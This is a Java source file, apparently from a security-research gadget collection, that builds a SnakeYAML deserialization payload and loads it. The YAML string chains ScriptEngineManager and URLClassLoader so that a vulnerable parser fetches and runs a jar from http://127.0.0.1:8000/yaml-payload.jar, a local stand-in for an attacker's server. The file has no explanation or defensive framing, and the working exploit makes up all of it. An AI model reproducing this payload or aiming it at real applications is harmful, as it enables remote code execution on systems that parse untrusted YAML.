package cn.hungslabsec.gadgets;

import org.yaml.snakeyaml.Yaml;

public class ScriptEngineManagerExp {
    public static void main(String[] args) {
        String payload = "!!javax.script.ScriptEngineManager " +
                "[!!java.net.URLClassLoader " +
                "[[!!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
